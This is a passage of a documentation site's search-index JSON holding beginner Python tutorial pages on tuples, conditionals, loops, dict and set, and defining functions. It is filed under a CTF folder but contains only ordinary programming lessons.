contain three elements: <code>a'',</code>b'' and a list.</p> <p></p> <p>When we modify the elements <code>'A'</code> and <code>'B'</code> of the list to <code>'X'</code> and <code>'Y'</code>, the tuples become:</p> <p></p> <p>On the surface, the elements of the tuples do change, but in fact, it is not the elements of the tuples that change, but the elements of the lists. tuples do not change the lists they point to in the beginning to other lists, so the so-called \"unchanging\" of tuples means that each element of the tuples points to the same list forever. The tuple's so-called \"invariant\" means that each element of the tuple points to the same element forever. That is, if you point to <code>'a'', you cannot change it to point to</code>'b'', and if you point to a list, you cannot change it to point to another object, but the list itself is mutable!</p> <p>After understanding the \"pointing to the same\", how to create a tuple whose content also remains the same? Then we must ensure that each element of the tuple itself can not change.</p>"},{"location":"CTF/Python_2/#summary_3","title":"Summary","text":"<p>lists and tuples are Python's built-in ordered collections, one mutable and one immutable. Choose to use them as needed.</p>"},{"location":"CTF/Python_2/#reference-source-code_1","title":"Reference source code","text":"<p>the_list.py</p> <p>the_tuple.py</p>"},{"location":"CTF/Python_2/#conditional-judgment","title":"Conditional Judgment","text":""},{"location":"CTF/Python_2/#conditional-judgment_1","title":"Conditional Judgment","text":"<p>The computer can do many automated tasks because it can make its own conditional judgments.</p> <p>For example, entering the user's age and printing different things depending on the age is implemented in a Python program with the <code>if</code> statement.</p> <pre><code>age = 20\nif age &gt;= 18:\n    print('your age is', age)\n    print('adult')\n</code></pre> <p>According to Python's indentation rules, if the <code>if</code> statement is judged to be <code>True</code>, the two lines of the indented print statement are executed, otherwise, nothing is done.</p> <p>You can also add an <code>else</code> statement to <code>if</code>, meaning that if <code>if</code> is judged to be <code>False</code>, don't execute the <code>if</code> content and go ahead and execute the <code>else</code>.</p> <pre><code>age = 3\nif age &gt;= 18:\n    print('your age is', age)\n    print('adult')\nelse:\n    print('your age is', age)\n    print('teenager')\n</code></pre> <p>Be careful not to underwrite the colon <code>:</code>.</p> <p>Of course the above judgement is very rough, it is perfectly possible to make a more detailed judgement with <code>elif</code>:</p> <pre><code>age = 3\nif age &gt;= 18:\n    print('adult')\nelif age &gt;= 6:\n    print('teenager')\nelse:\n    print('kid')\n</code></pre> <p><code>elif</code> is short for <code>else if</code>, and it is perfectly possible to have more than one <code>elif</code>, so the full form of the <code>if</code> statement is:</p> <pre><code>if &lt;\u6761\u4ef6\u5224\u65ad1&gt;:\n    &lt;\u6267\u884c1&gt;\nelif &lt;\u6761\u4ef6\u5224\u65ad2&gt;:\n    &lt;\u6267\u884c2&gt;\nelif &lt;\u6761\u4ef6\u5224\u65ad3&gt;:\n    &lt;\u6267\u884c3&gt;\nelse:\n    &lt;\u6267\u884c4&gt;\n</code></pre> <p>The execution of the <code>if</code> statement has a feature that it judges from top to bottom. If <code>True</code> is made on a certain judgment, after executing the statement corresponding to that judgment, the remaining <code>elif</code> and <code>else</code> are ignored. So, please test and explain why the following program prints <code>teenager</code>.</p> <pre><code>age = 20\nif age &gt;= 6:\n    print('teenager')\nelif age &gt;= 18:\n    print('adult')\nelse:\n    print('kid')\n</code></pre> <p>The <code>if</code> judgment condition can also be abbreviated, for example by writing.</p> <pre><code>if x:\n    print('True')\n</code></pre> <p>As long as <code>x</code> is a non-zero value, a non-empty string, a non-empty list, etc., it is judged to be <code>True</code>, otherwise it is <code>False</code>.</p>"},{"location":"CTF/Python_2/#reconsider-input","title":"Reconsider input","text":"<p>Finally, let's look at a problematic conditional judgment. Many students will use <code>input()</code> to read the user's input, so that they can enter it themselves and the program runs more interestingly: <code>input()</code>.</p> <pre><code>birth = input('birth: ')\nif birth &lt; 2000:\n    print('00\u524d')\nelse:\n    print('00\u540e')\n</code></pre> <p>Entering <code>1982</code> resulted in the following error.</p> <pre><code>Traceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nTypeError: unorderable types: str() &gt; int()\n</code></pre> <p>This is because the data type returned by <code>input()</code> is <code>str</code>, which cannot be compared directly with an integer and must first be converted from <code>str</code> to an integer. Python provides the <code>int()</code> function to do this.</p> <pre><code>s = input('birth: ')\nbirth = int(s)\nif birth &lt; 2000:\n    print('00\u524d')\nelse:\n    print('00\u540e')\n</code></pre> <p>Run it again and you will get the correct result. But what if you type <code>abc</code>? Again, you will get an error message.</p> <pre><code>Traceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nValueError: invalid literal for int() with base 10: 'abc'\n</code></pre> <p>It turns out that the <code>int()</code> function reports an error when it finds a string that is not a legal number, and the program exits.</p> <p>How do you check for and catch program runtime errors? We'll talk about errors and debugging later.</p>"},{"location":"CTF/Python_2/#summary_4","title":"Summary","text":"<p>Conditional judgments allow the computer to make its own choices, Python's if... .elif... ...else is very flexible.</p> <p>Conditional judgments match from the top down, executing the corresponding block when the condition is met, and subsequent elifs and else's are no longer executed.</p> <p></p>"},{"location":"CTF/Python_2/#reference-source-code_2","title":"Reference source code","text":"<p>do_if.py</p>"},{"location":"CTF/Python_2/#loop","title":"Loop","text":""},{"location":"CTF/Python_2/#loop_1","title":"Loop","text":"<p>To calculate 1+2+3, we can simply write the expression.</p> <pre><code>&gt;&gt;&gt; 1 + 2 + 3\n6\n</code></pre> <p>To calculate 1+2+3+... +10, you can barely write it.</p> <p>However, to calculate 1+2+3+... +10,000, it's impossible to write the expression directly.</p> <p>In order for the computer to compute thousands of iterations, we need loop statements.</p> <p>Python has two kinds of loops, a for... .in loops that iterate through each element of a list or tuple in turn, see the example.</p> <pre><code>names = ['Michael', 'Bob', 'Tracy']\nfor name in names:\n    print(name)\n</code></pre> <p>Executing this code will print each element of <code>names</code> in turn.</p> <pre><code>Michael\nBob\nTracy\n</code></pre> <p>So the <code>for x in ...</code>  loop is a statement that substitutes each element into the variable <code>x</code> and then executes the indented block.</p> <p>Another example is if we want to calculate the sum of integers from 1 to 10, we can use a <code>sum</code> variable to do the accumulation.</p> <pre><code>sum = 0\nfor x in [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]:\n    sum = sum + x\nprint(sum)\n</code></pre> <p>If you want to calculate the sum of integers from 1 to 100, it is a bit difficult to write from 1 to 100. Fortunately, Python provides a <code>range()</code> function that can generate a sequence of integers, which can be converted to a list by the <code>list()</code> function. for example, the sequence generated by <code>range(5)</code> is a sequence of integers less than 5 starting from 0.</p> <pre><code>&gt;&gt;&gt; list(range(5))\n[0, 1, 2, 3, 4]\n</code></pre> <p><code>range(101)</code> will generate a sequence of integers from 0-100, calculated as follows.</p> <pre><code># -*- coding: utf-8 -*-\nsum = 0\nfor x in range(101):\n    sum = sum + x\nprint(sum)\n</code></pre> <p>Please run the above code yourself to see if the result is the 5050 that Gauss students mentally calculated back then.</p> <p>The second type of loop is the while loop, which keeps looping as long as the conditions are met, and exits the loop when the conditions are not met. For example, if we want to calculate the sum of all odd numbers within 100, we can use a while loop to do the following.</p> <pre><code>sum = 0\nn = 99\nwhile n &gt; 0:\n    sum = sum + n\n    n = n - 2\nprint(sum)\n</code></pre> <p>Inside the loop, the variable <code>n</code> keeps decreasing itself until it becomes <code>-1</code>, when the while condition is no longer met and the loop exits.</p>"},{"location":"CTF/Python_2/#break","title":"break","text":"<p>In a loop, the <code>break</code> statement can exit the loop early. For example, to have looped to print the numbers 1 to 100.</p> <pre><code>n = 1\nwhile n &lt;= 100:\n    print(n)\n    n = n + 1\nprint('END')\n</code></pre> <p>The code above prints out 1 to 100.</p> <p>To end the loop early, you can use the <code>break</code> statement.</p> <pre><code>n = 1\nwhile n &lt;= 100:\n    if n &gt; 10: # When n = 11, the condition is met and the break statement is executed\n        break # The break statement will end the current loop\n    print(n)\n    n = n + 1\nprint('END')\n</code></pre> <p>As you can see from the above code, after printing out 1~10, <code>END</code> is printed immediately afterwards and the program ends.</p> <p>It can be seen that the function of <code>break</code> is to end the loop early.</p>"},{"location":"CTF/Python_2/#continue","title":"continue","text":"<p>During the loop, you can also skip the current loop and start the next one directly with the <code>continue</code> statement.</p> <pre><code>n = 0\nwhile n &lt; 10:\n    n = n + 1\n    print(n)\n</code></pre> <p>The above program prints 1 to 10. However, if we want to print only odd numbers, we can skip certain loops with the <code>continue</code> statement.</p> <pre><code>n = 0\nwhile n &lt; 10:\n    n = n + 1\n    if n % 2 == 0: # If n is an even number, execute the continue statement\n        continue # The continue statement will continue directly to the next loop, and the subsequent print() statement will not be executed\n    print(n)\n</code></pre> <p>Executing the above code, you can see that it no longer prints 1 to 10, but 1, 3, 5, 7, and 9.</p> <p>You can see that the purpose of <code>continue</code> is to end the current loop early and start the next one directly.</p>"},{"location":"CTF/Python_2/#summary_5","title":"Summary","text":"<p>Loops are an effective way to get the computer to do repetitive tasks.</p> <p>The <code>break</code> statement can exit the loop directly during the loop, while the <code>continue</code> statement can end the current round of loops early and start the next round directly. Both of these statements usually must be used in conjunction with the <code>if</code> statement.</p> <p>Be especially careful not to abuse the <code>break</code> and <code>continue</code> statements. <code>break</code> and <code>continue</code> can cause the code execution logic to bifurcate too much and be prone to errors. Most loops do not require the use of <code>break</code> and <code>continue</code> statements, and both of the above examples can be done by rewriting the loop condition or modifying the loop logic to remove the <code>break</code> and <code>continue</code> statements.</p> <p>In some cases, if the code is written in a problematic way, the program will fall into a \"dead loop\", that is, a loop that goes on forever. In this case, you can use <code>Ctrl+C</code> to exit the program or force the Python process to end.</p> <p>Please try to write a dead loop program.</p>"},{"location":"CTF/Python_2/#reference-source-code_3","title":"Reference source code","text":"<p>do_for.py</p> <p>do_while.py</p>"},{"location":"CTF/Python_2/#using-dict-and-set","title":"Using dict and set","text":""},{"location":"CTF/Python_2/#dict","title":"dict","text":"<p>Python has built-in support for dictionaries: dict, also known as dictionary or map in other languages, uses key-value storage and is extremely fast to find.</p> <p>For example, suppose you want to find the corresponding grades based on the names of your classmates, and if you implement it with lists, you need two lists.</p> <pre><code>names = ['Michael', 'Bob', 'Tracy']\nscores = [95, 75, 85]\n</code></pre> <p>Given a name, to find the corresponding score, you have to find the corresponding position in names and then take out the corresponding score from scores, the longer the list, the longer it takes.</p> <p>If we use a dict, we only need a \"name\" - \"score\" comparison table, and we can find the scores according to the names directly, no matter how big the table is, the search speed will not be slow. Write a dict in Python as follows.</p> <pre><code>&gt;&gt;&gt; d = {'Michael': 95, 'Bob': 75, 'Tracy': 85}\n&gt;&gt;&gt; d['Michael']\n95\n</code></pre> <p>Why is dict lookup so fast? Because the principle of dict implementation is the same as looking up a dictionary. Suppose the dictionary contains 10,000 Chinese characters, and we want to look up a certain word, one way is to turn the dictionary backward from the first page until we find the word we want, this method is the method of finding elements in the list, the larger the list is, the slower the search is.</p> <p>The second way is to look up the page number corresponding to the word in the index table of the dictionary (e.g., the part number table), and then turn directly to that page and find the word. No matter which word you are looking for, this search is very fast and does not slow down as the size of the dictionary increases.</p> <p>Given a name, such as <code>'Michael'</code>, dict can internally calculate the \"page number\" of <code>Michael</code>, which is the memory address where the number <code>95</code> is stored, and take it out directly, so it is very fast.</p> <p>As you can guess, this key-value storage method, when you put it in, you must calculate the storage location of the value according to the key, so that when you take it, you can get the value directly according to the key.</p> <p>The method of putting data into dict, in addition to the initialization specified, can also be put in by key.</p> <pre><code>&gt;&gt;&gt; d['Adam'] = 67\n&gt;&gt;&gt; d['Adam']\n67\n</code></pre> <p>Since a key can only correspond to a value, putting a value to a key multiple times will flush out the previous value.</p> <pre><code>&gt;&gt;&gt; d['Jack'] = 90\n&gt;&gt;&gt; d['Jack']\n90\n&gt;&gt;&gt; d['Jack'] = 88\n&gt;&gt;&gt; d['Jack']\n88\n</code></pre> <p>If the key does not exist, dict will report an error.</p> <pre><code>&gt;&gt;&gt; d['Thomas']\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nKeyError: 'Thomas'\n</code></pre> <p>To avoid the error that the key does not exist, there are two ways, one is to determine whether the key exists by <code>in</code>.</p> <pre><code>&gt;&gt;&gt; 'Thomas' in d\nFalse\n</code></pre> <p>The second is through the <code>get()</code> method provided by dict, which can return <code>None</code> if the key does not exist, or the value specified by itself.</p> <pre><code>&gt;&gt;&gt; d.get('Thomas')\n&gt;&gt;&gt; d.get('Thomas', -1)\n-1\n</code></pre> <p>Note: Python's interactive environment does not show the result when <code>None</code> is returned.</p> <p>To delete a key, use the <code>pop(key)</code> method, and the corresponding value will also be deleted from the dict.</p> <pre><code>&gt;&gt;&gt; d.pop('Bob')\n75\n&gt;&gt;&gt; d\n{'Michael': 95, 'Tracy': 85}\n</code></pre> <p>Be sure to note that the order of storage inside a dict has no relation to the order in which the keys are placed.</p> <p>Compared with list, dict has the following features.</p> <ol> <li>the speed of lookup and insertion is extremely fast and does not slow down with the increase of keys.</li> <li>it takes up a lot of memory and wastes a lot of memory.</li> </ol> <p>On the contrary, list has the following features.</p> <ol> <li>the search and insertion time increases with the increase of elements.</li> <li>takes up little space and wastes little memory.</li> </ol> <p>So, dict is a way to trade space for time.</p> <p>dict can be used in many places where high-speed lookup is needed, and it is almost ubiquitous in Python code. It is very important to use dict correctly, and the first thing to keep in mind is that the key of dict must be immutable object.</p> <p>This is because dict calculates the storage location of value based on key, and if each time the same key is calculated the result is different, then the dict is completely confused internally. This algorithm for calculating the location by key is called a hash algorithm (Hash).</p> <p>To ensure the correctness of the hash, the object that is the key cannot change. In Python, strings, integers, etc. are immutable and can therefore be safely used as keys, whereas lists are mutable and cannot be used as keys.</p> <pre><code>&gt;&gt;&gt; key = [1, 2, 3]\n&gt;&gt;&gt; d[key] = 'a list'\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nTypeError: unhashable type: 'list'\n</code></pre>"},{"location":"CTF/Python_2/#set","title":"set","text":"<p>A set is similar to a dict in that it is also a set of keys, but does not store values. since keys cannot be duplicated, there are no duplicate keys in a set.</p> <p>To create a set, a list is provided as the input set.</p> <pre><code>&gt;&gt;&gt; s = set([1, 2, 3])\n&gt;&gt;&gt; s\n{1, 2, 3}\n</code></pre> <p>Note that the passed parameter <code>[1, 2, 3]</code> is a list, and the displayed <code>{1, 2, 3}</code> just tells you that there are 3 elements inside this set, 1, 2, 3, and the displayed order does not indicate that the set is ordered.</p> <p>Duplicate elements are automatically filtered in the set.</p> <pre><code>&gt;&gt;&gt; s = set([1, 1, 2, 2, 3, 3])\n&gt;&gt;&gt; s\n{1, 2, 3}\n</code></pre> <p>Elements can be added to the set by the <code>add(key)</code> method, which can be repeated, but will not have the effect of.</p> <pre><code>&gt;&gt;&gt; s.add(4)\n&gt;&gt;&gt; s\n{1, 2, 3, 4}\n&gt;&gt;&gt; s.add(4)\n&gt;&gt;&gt; s\n{1, 2, 3, 4}\n</code></pre> <p>Elements can be removed by the <code>remove(key)</code> method.</p> <pre><code>&gt;&gt;&gt; s.remove(4)\n&gt;&gt;&gt; s\n{1, 2, 3}\n</code></pre> <p>set can be seen as a mathematically unordered and non-repetitive set of elements, so that two sets can be intersected, merged, etc. in the mathematical sense.</p> <pre><code>&gt;&gt;&gt; s1 = set([1, 2, 3])\n&gt;&gt;&gt; s2 = set([2, 3, 4])\n&gt;&gt;&gt; s1 &amp; s2\n{2, 3}\n&gt;&gt;&gt; s1 | s2\n{1, 2, 3, 4}\n</code></pre> <p>The only difference between set and dict is that there is no corresponding value stored, but the principle of set is the same as dict, so it is also not possible to put mutable objects into it, because there is no way to determine whether two mutable objects are equal, and there is no guarantee that there will be \"no duplicate elements\" inside the set. Try putting a list into set and see if you get an error.</p>"},{"location":"CTF/Python_2/#re-discuss-immutable-objects","title":"Re-discuss immutable objects","text":"<p>As we said above, str is an immutable object, while list is a mutable object.</p> <p>For mutable objects, such as list, the contents of list will change if list is manipulated, for example.</p> <pre><code>&gt;&gt;&gt; a = ['c', 'b', 'a']\n&gt;&gt;&gt; a.sort()\n&gt;&gt;&gt; a\n['a', 'b', 'c']\n</code></pre> <p>And for immutable objects, such as str, what about operations on str.</p> <pre><code>&gt;&gt;&gt; a = 'abc'\n&gt;&gt;&gt; a.replace('a', 'A')\n'Abc'\n&gt;&gt;&gt; a\n'abc'\n</code></pre> <p>Although the string has a <code>replace()</code> method, and it does turn out to be <code>'Abc'</code>, the variable <code>a</code> still ends up being <code>'abc'</code>, so how should we understand it?</p> <p>Let's change the code to the following.</p> <pre><code>&gt;&gt;&gt; a = 'abc'\n&gt;&gt;&gt; b = a.replace('a', 'A')\n&gt;&gt;&gt; b\n'Abc'\n&gt;&gt;&gt; a\n'abc'\n</code></pre> <p>The thing to always keep in mind is that <code>a</code> is the variable, and <code>'abc'</code> is the string object! There are times when we often say that the content of the object <code>a</code> is <code>'abc'</code>, but what we really mean is that <code>a</code> itself is a variable, and it is the content of the object it points to that is <code>'abc'</code>.</p> <pre><code>\u250c\u2500\u2500\u2500\u2510                  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 a \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500&gt;\u2502 'abc' \u2502\n\u2514\u2500\u2500\u2500\u2518                  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>When we call <code>a.replace('a', 'A')</code>, the call to method <code>replace</code> actually acts on the string object <code>'abc'</code>, and the method, despite its name <code>replace</code>, does not change the content of the string <code>'abc'</code>. Instead, the <code>replace</code> method creates a new string <code>'Abc'</code> and returns it, and if we use the variable <code>b</code> to point to that new string, it is easy to understand that the variable <code>a</code> still points to the original string <code>'abc'</code>, but the variable <code>b</code> points to the new string <code>'Abc'</code>.</p> <pre><code>\u250c\u2500\u2500\u2500\u2510                  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 a \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500&gt;\u2502 'abc' \u2502\n\u2514\u2500\u2500\u2500\u2518                  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\u250c\u2500\u2500\u2500\u2510                  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 b \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500&gt;\u2502 'Abc' \u2502\n\u2514\u2500\u2500\u2500\u2518                  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>So, for immutable objects, calling any method on the object itself will not change the content of the object itself. Instead, these methods create new objects and return them, thus ensuring that the immutable object itself is always immutable.</p>"},{"location":"CTF/Python_2/#summary_6","title":"Summary","text":"<p>Using a key-value storage structure for dict is very useful in Python. It is important to choose immutable objects as keys, and the most common key is a string.</p> <p>While tuple is an immutable object, try putting <code>(1, 2, 3)</code> and <code>(1, [2, 3])</code> into a dict or set and interpret the results.</p>"},{"location":"CTF/Python_2/#reference-source-code_4","title":"Reference source code","text":"<p>the_dict.py</p> <p>the_set.py</p>"},{"location":"CTF/Python_3/","title":"Python Programming Quick Guide - Functions","text":"<p>https://www.liaoxuefeng.com/wiki/1016959663602400/1017063413904832</p> <p>https://docs.python.org/3/tutorial/index.html</p>"},{"location":"CTF/Python_3/#function","title":"Function","text":"<p>We know that the formula for calculating the area of a circle is</p> <p>S = \u03c0r^2</p> <p>When we know the value of radius <code>r</code>, we can calculate the area according to the formula. Suppose we need to calculate the area of 3 circles of different sizes.</p> <pre><code>r1 = 12.34\nr2 = 9.08\nr3 = 73.1\ns1 = 3.14 * r1 * r1\ns2 = 3.14 * r2 * r2\ns3 = 3.14 * r3 * r3\n</code></pre> <p>When there is a regular repetition of the code, you need to beware that writing <code>3.14 * x * x</code> each time is not only troublesome, but, if you want to change <code>3.14</code> to <code>3.14159265359</code>, you have to replace it all.</p> <p>With functions, instead of writing <code>s = 3.14 * x * x</code> every time, we write the more meaningful function call <code>s = area_of_circle(x)</code>, and the function <code>area_of_circle</code> itself only needs to be written once, so it can be called multiple times.</p> <p>Basically all high-level languages support functions, and Python is no exception. not only can Python be very flexible in defining functions, but it has many useful functions built in itself that can be called directly.</p>"},{"location":"CTF/Python_3/#abstraction","title":"Abstraction","text":"<p>Abstraction is a very common concept in mathematics. As an example.</p> <p>Calculating the sum of a series, e.g., <code>1 + 2 + 3 + ... + 100</code>, is very inconvenient to write, so mathematicians invented the summation symbol \u2211, which can be written as <code>1 + 2 + 3 + ... + 100</code> is written as.</p> <p></p> <p>This abstract notation is very powerful because we see that \u2211 can be understood as a summation, rather than reducing to a low-level addition operation.</p> <p>Moreover, this abstract notation is scalable, e.g.</p> <p></p> <p>Reduced to addition it becomes.</p> <p>(1 x 1 + 1) + (2 x 2 + 1) + (3 x 3 + 1) + ... + (100 x 100 + 1)</p> <p>As you can see, abstraction allows us to think directly at a higher level, without caring about the underlying concrete computational process.</p> <p>Writing computer programs is the same, and functions are one of the most basic ways of abstracting code.</p>"},{"location":"CTF/Python_3/#calling-functions","title":"Calling functions","text":"<p>Python has a lot of useful functions built in that we can call directly.</p> <p>To call a function, you need to know the name of the function and its arguments, for example, the function <code>abs</code> that finds the absolute value has only one argument. The documentation can be viewed directly from Python's official website at</p> <p>http://docs.python.org/3/library/functions.html#abs</p> <p>You can also view the help information for the <code>abs</code> function at the interactive command line via <code>help(abs)</code>.</p> <p>To invoke the <code>abs</code> function.</p> <pre><code>&gt;&gt;&gt; abs(100)\n100\n&gt;&gt;&gt; abs(-20)\n20\n&gt;&gt;&gt; abs(12.34)\n12.34\n</code></pre> <p>Calling a function with the wrong number of arguments passed in will report a <code>TypeError</code> error, and Python will tell you explicitly that <code>abs()</code> has and only has 1 argument, but gives two.</p> <pre><code>&gt;&gt;&gt; abs(1, 2)\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nTypeError: abs() takes exactly one argument (2 given)\n</code></pre> <p>If the number of arguments passed in is correct, but the argument type is not accepted by the function, a <code>TypeError</code> error is also reported and the error message is given: <code>str</code> is the wrong argument type.</p> <pre><code>&gt;&gt;&gt; abs('a')\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nTypeError: bad operand type for abs(): 'str'\n</code></pre> <p>And the <code>max</code> function <code>max()</code> can take any number of arguments and return the largest one.</p> <pre><code>&gt;&gt;&gt; max(1, 2)\n2\n&gt;&gt;&gt; max(2, 3, 1, -5)\n3\n</code></pre>"},{"location":"CTF/Python_3/#data-type-conversions","title":"Data type conversions","text":"<p>Python's built-in common functions also include data type conversion functions, such as the <code>int()</code> function that converts other data types to integers:</p> <pre><code>&gt;&gt;&gt; int('123')\n123\n&gt;&gt;&gt; int(12.34)\n12\n&gt;&gt;&gt; float('12.34')\n12.34\n&gt;&gt;&gt; str(1.23)\n'1.23'\n&gt;&gt;&gt; str(100)\n'100'\n&gt;&gt;&gt; bool(1)\nTrue\n&gt;&gt;&gt; bool('')\nFalse\n</code></pre> <p>A function name is actually a reference to a function object, and it is possible to assign the function name to a variable, which is equivalent to giving the function an \"alias\".</p> <pre><code>&gt;&gt;&gt; a = abs # Variable a points to the abs function\n&gt;&gt;&gt; a(-1) # So you can also call the abs function from a\n1\n</code></pre>"},{"location":"CTF/Python_3/#define-function","title":"Define function","text":"<p>In Python, to define a function you use the <code>def</code> statement, write the function name, the parentheses, the arguments in the parentheses, and the colon <code>:</code> in that order, then, write the function body in an indented block, and the return value of the function is returned with the <code>return</code> statement.</p> <p>Let's take a custom <code>my_abs</code> function for absolute values as an example.</p> <pre><code># -*- coding: utf-8 -*-\ndef my_abs(x):\n    if x &gt;= 0:\n        return x\n    else:\n        return -x\n\nprint(my_abs(-99))\n</code></pre> <p>Please test it yourself and call <code>my_abs</code> to see if the returned result is correct.</p> <p>Note that when the statements inside the function body are executed, once they reach <code>return</code>, the function is executed and the result is returned. Thus, very complex logic can be implemented inside functions through conditional judgments and loops.</p> <p>If there is no <code>return</code> statement, the function will also return the result when it finishes executing, but the result will be <code>None</code>. <code>return None</code> can be abbreviated to <code>return</code>.</p> <p>When defining functions in the Python interactive environment, note that Python will show a <code>...</code> prompt. When you finish defining the function you need to press enter twice to get back to the <code>&gt;&gt;&gt;</code> prompt.</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502Command Prompt - python                           - \u25a1 x \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502&gt;&gt;&gt; def my_abs(x):                                      \u2502\n\u2502...     if x &gt;= 0:                                      \u2502\n\u2502...         return x                                    \u2502\n\u2502...     else:                                           \u2502\n\u2502...         return -x                                   \u2502\n\u2502...                                                     \u2502\n\u2502&gt;&gt;&gt; my_abs(-9)                                          \u2502\n\u25029                                                       \u2502\n\u2502&gt;&gt;&gt; _                                                   \u2502\n\u2502                                                        \u2502\n\u2502                                                        \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>If you have already saved the function definition of <code>my_abs()</code> as an <code>abstest.py</code> file, then you can start the Python interpreter in the current directory of that file and import the <code>my_abs()</code> function with <code>from abstest import my_abs</code>, noting that <code>abstest</code> is the file name (without the <code>. py</code> extension).</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502Command Prompt - python                           - \u25a1 x \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502&gt;&gt;&gt; from abstest import my_abs                          \u2502\n\u2502&gt;&gt;&gt; my_abs(-9)                                          \u2502\n\u25029                                                       \u2502\n\u2502&gt;&gt;&gt; _                                                   \u2502\n\u2502                                                        \u2502\n\u2502                                                        \u2502\n\u2502                                                        \u2502\n\u2502                                                        \u2502\n\u2502                                                        \u2502\n\u2502                                                        \u2502\n\u2502                                                        \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>The usage of <code>import</code> is described in detail in the subsequent section Modules.</p>"},{"location":"CTF/Python_3/#empty-functions","title":"Empty functions","text":"<p>If you want to define an empty function that doesn't do anything, you can use the <code>pass</code> statement.</p> <pre><code>def nop():\n    pass\n</code></pre> <p>The <code>pass</code> statement doesn't do anything, so what's the point? Actually <code>pass</code> can be used as a placeholder, for example, if you haven't figured out how to write the code for a function yet, you can put a <code>pass</code> first so that the code can run.</p> <p><code>pass</code> can also be used in other statements, such as.</p> <pre><code>if age &gt;= 18:\n    pass\n</code></pre> <p>Missing <code>pass</code>, the code will run with syntax errors.</p>"},{"location":"CTF/Python_3/#parameter-checking","title":"Parameter checking","text":"<p>When calling a function with the wrong number of arguments, the Python interpreter will automatically check for it and throw <code>TypeError</code>: </p> <pre><code>&gt;&gt;&gt; my_abs(1, 2)\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nTypeError: my_abs() takes 1 positional argument but 2 were given\n</code></pre> <p>But if the argument type is wrong, the Python interpreter can't check it for us. Try the difference between <code>my_abs</code> and the built-in function <code>abs</code>.</p> <pre><code>&gt;&gt;&gt; my_abs('A')\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\n  File \"&lt;stdin&gt;\", line 2, in my_abs\nTypeError: unorderable types: str() &gt;= int()\n&gt;&gt;&gt; abs('A')\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nTypeError: 